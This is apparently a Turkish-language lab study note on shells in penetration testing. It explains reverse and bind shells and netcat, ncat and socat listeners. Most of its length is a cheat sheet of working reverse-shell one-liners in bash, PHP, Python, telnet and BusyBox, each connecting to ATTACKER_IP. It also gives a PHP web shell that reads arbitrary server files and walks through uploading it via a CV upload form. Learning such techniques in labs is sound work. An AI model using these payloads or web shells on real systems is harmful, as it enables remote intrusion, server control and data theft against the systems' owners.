## 🧠 1. Mimari Yapı: Siber Güvenlikte Kabuk (Shell) Kavramı

> **🛡️ Siber Güvenlik Analisti Notu:** Bir kabuk (shell), kullanıcının işletim sistemi çekirdeği (kernel) ile etkileşime girmesini sağlayan bir yazılımdır. Siber güvenlikte ise "shell", sızılan bir hedef sistemde komut çalıştırmak, dosya manipüle etmek ve yetki yükseltmek amacıyla ele geçirilen canlı terminal oturumunu ifade eder. İşin teorisini ezberlemek bir yere kadardır; gerçek gelişim, terminalde bizzat ellerini kirleterek (hands-on) o bağlantıyı yakalamakla başlar.

### 💀 Saldırganların Shell Elde Ettikten Sonraki Aksiyon Planı

- **Remote System Control (Uzaktan Kontrol):** Hedef makinede uzaktan istenilen zararlı yazılımı ve komutları koşturmak.
    
- **Privilege Escalation (Yetki Yükseltme):** Düşük yetkili bir kabuktan (`www-data` gibi) sistemin en yetkili kullanıcısı (`root` veya `Administrator`) seviyesine tırmanmak.
    
- **Data Exfiltration (Veri Sızdırma):** Sistemdeki hassas verileri, veri tabanlarını ve şifreleri okuyup kendi makinelerine transfer etmek.
    
- **Persistence (Kalıcılık Sağlama):** Sistemde arka kapılar (backdoor) veya gizli kullanıcılar oluşturarak sonraki süreçlerde de erişimi kaybetmemek.
    
- **Pivoting (Eksen Döndürme / Sıçrama):** Ele geçirilen ilk kurban makineyi bir basamak (launching pad) olarak kullanarak, şirketin iç ağındaki (internal network) diğer gizli sunuculara saldırmak.
    

## 📂 2. Bağlantı Yönlerine Göre Kabuk Türleri

### 🔄 A. Reverse Shell (Tersine Kabuk)

Bağlantının **hedef (kurban) sistemden saldırganın makinesine doğru** başlatıldığı kabuk türüdür. Siber dünyada en popüler yöntemdir.

- **Neden Popüler?** Şirketlerin güvenlik duvarları (Firewall) genellikle dışarıdan içeriye gelen bağlantıları engeller ancak içeriden dışarıya (outbound) giden trafiğe izin verir. Reverse shell, firewall engellerini aşmak ve ağ cihazlarına yakalanmamak için biçilmiş kaftandır.
    
- **Netcat Dinleyici Parametreleri (`nc -lvnp 443`):**
    
    - `-l`: Netcat'e bir bağlantı bekleyen "dinleyici (listener)" moduna geçmesini emreder.
        
    - `-v`: Detaylı çıktı (verbose) modunu açar, bağlantı durumunu canlı gösterir.
        
    - `-n`: DNS çözümlemesini kapatır. İşlemleri hızlandırır ve sadece saf IP adresleriyle çalışır.
        
    - `-p`: Dinlenecek hedef portu belirtir (Gizlenmek için genellikle `443`, `80`, `53`, `8080` veya `445` gibi meşru portlar seçilir).
        

### ⛓️ B. Bind Shell (Bağlantılı Kabuk)

Hedef makinede **belirli bir portun doğrudan dinlemeye alınması** ve saldırganın o porta dışarıdan bağlanarak terminali elde etmesi yöntemidir.

- **Dezavantajı:** Güvenlik duvarları dışarıdan gelen bu yabancı port bağlantı isteklerini şak diye engelleyeceği için gerçek operasyonlarda başarı şansı daha düşüktür ve kolayca fark edilir.
    
- **Yetki Kuralı:** Linux sistemlerde `1024` numarasının altındaki portlarda (Örn: Port 80, 443) bir Bind Shell açabilmek için kesinlikle **root (yüksek yetkili)** erişimi gerekir. Port `8080` gibi yüksek portlar seçilerek bu kısıtlama aşılabilir.
    

## 🎛️ 3. Gelişmiş Dinleyici (Listener) Araçları

Düz bir Netcat shell'inde ok tuşları çalışmaz ve terminal kararsızdır. Bunu aşmak veya trafiği şifrelemek için alternatif güçlü araçlar kullanılır:

|**Araç Adı**|**Öne Çıkan Siber Güvenlik Yeteneği**|**Örnek Komut Yapısı**|
|---|---|---|
|**`rlwrap`**|GNU readline kütüphanesini kullanarak düz Netcat shell'ine **ok tuşlarını (arrow keys) ve komut geçmişini (history)** kazandırır.|`rlwrap nc -lvnp 443`|
|**`ncat`**|Nmap projesi tarafından geliştirilen gelişmiş Netcat'tir. En büyük artısı kabuk trafiğini **SSL/TLS ile şifreleyerek** IDS/IPS sistemlerinden gizleyebilmesidir.|`ncat --ssl -lvnp 4444`|
|**`socat`**|İki farklı veri kaynağı arasında çift yönlü byte transferi yapabilen, çok daha esnek ve güçlü bir soket aracıdır.|`socat -d -d TCP-LISTEN:443 STDOUT`|

## 🔬 4. İşletim Sistemi ve Dil Tabanlı Payload Kütüphanesi

Saldırganların Command Injection (Komut Enjeksiyonu) gibi zafiyetleri sömürürken hedef sistemde tetiklediği efsanevi reverse shell kodları:

### 🐚 Bash Tabanlı Payloadlar

Bash

```
# Klasik Boru Hattı (Named Pipe - FIFO) Payload'u (Odalarda En Çok Tercih Edilen)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f

# Doğrudan TCP Soketine Bağlanan Kısa Bash Shell'i
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# Bash Read Line Gelişmiş Filtre Varyasyonu
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

# File Descriptor (Dosya Tanımlayıcı 196) Varyasyonu
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

### 🐘 PHP Tabanlı Payloadlar

Web sitelerinin arkasında kod çalıştırmak için kullanılan fonksiyon varyasyonları:

PHP

```
// exec() fonksiyonu ile soket tetikleme
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

// system() fonksiyonu ile tetikleme (Çıktıyı tarayıcıya basar)
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

_Dökümanda yer alan diğer kardeş fonksiyonlar:_ `shell_exec`, `passthru`, `popen`.

### 🐍 Python Tabanlı Payloadlar

Genellikle `subprocess` ve `pty` modülleri kullanılarak terminali simüle eder:

Python

```
# pty.spawn ile interaktif Bash kabuğu çağırma (Gereksinim: python -c veya PY-C)
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
```

### 🛠️ Alternatif Diğer Araçlar (Telnet, AWK, BusyBox)

- **Telnet:** `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF \| sh 1>$TF`
    
- **AWK:** TCP yeteneklerini kullanarak doğrudan `shell>` girdisi açar.
    
- **BusyBox:** Gömülü sistemlerde `busybox nc ATTACKER_IP 443 -e sh` ile shell üfler.
    

## 🌐 5. Web Shell Mimarisi ve İstismar Mantığı

**Web Shell**, hedef web sunucusunun desteklediği bir dilde (PHP, ASP, JSP vb.) yazılmış, tarayıcı üzerinden sunucuya komut göndermeyi sağlayan kötü amaçlı bir betiktir (script).

> **⚠️ Siber Analist Terim Tuzağı Uyarısı:** Sınavlarda ve teknik mülakatlarda "shell", "script" ve "file" kelimelerini birbirinin yerine kullanarak kafa karıştırmaya çalışırlar. Unutma; dosya uzantısı filtrelerinin esnek bırakılması zafiyetinin adı **Unrestricted File Upload**'dur; bu zafiyet kullanılarak içeri sızdırılan zararlı betiğin adı ise **Web Shell**'dir.

### 🖥️ Akıllı PHP Web Shell Tasarımı ve Yükleme Aşamaları

> **💡 Sahadan Pratik Tecrübe Notu:** Bu adımda yerel terminalimiz üzerinden `nano shell.php` komutunu koşturarak sıfırdan temiz bir dosya açıyoruz. PHP sözdizimini (syntax) tam hatırlamadığımız veya ezbere bilmediğimiz senaryolarda, Isiah gibi tecrübeli analist dökümanlarından/kopya kağıtlarından kurşun geçirmez kod bloklarını ödünç alıp nano editörünün içerisine yapıştırmak ve dosyayı kaydetmek en hızlı çözümdür.

Lab ortamında nano ile içi doldurulan otomatik dosya okuyucu betik mimarisi:

PHP

```
<?php
echo "<pre>";
echo "File content:\n";
// Eğer file parametresi girilmezse otomatik olarak kök dizindeki flag.txt'yi hedef alır!
$file = isset($_GET['file']) ? $_GET['file'] : '/flag.txt';
echo @file_get_contents($file);
echo "</pre>";
?>
```

1. **Dosya Hazırlığı:** Yukarıdaki akıllı kod `nano shell.php` komutuyla açılan dosyanın içerisine basılır ve kaydedilir.
    
2. **İçeri Fırlatma (Upload):** Savunmasız web sitesindeki (Port 8082) **"Upload Your CV"** (Özgeçmiş Yükle) kutusuna gidilir, "Browse..." denilerek bu `shell.php` seçilir ve sisteme yüklenir.
    
3. **Tetikleme ve Otomatik Bayrak Avı:** Yüklenen bu dosya sunucunun `/uploads/` dizinine düşer. Tarayıcıdan doğrudan `http://MACHINE_IP:8082/uploads/shell.php` adresine gidildiği an, kod içerisindeki `isset` mekanizması devreye girer ve hiçbir komut parametresi yazmaya gerek kalmadan şak diye ikinci gizli bayrağı tarayıcı ekranına basar.
    

### 🌍 İnternetteki Popüler Hazır Web Sheller

- **p0wny-shell:** Tek bir dosyadan oluşan, ekranda minimalist bir mini terminal simüle eden şahane bir PHP web kabuğudur.
    
- **b374k / c99 shell:** Dosya yöneticisi, süreç kontrolü, veri tabanı bağlantısı ve gelişmiş yetki yükseltme araçları barındıran tam teşekküllü ağır siber silahlardır.
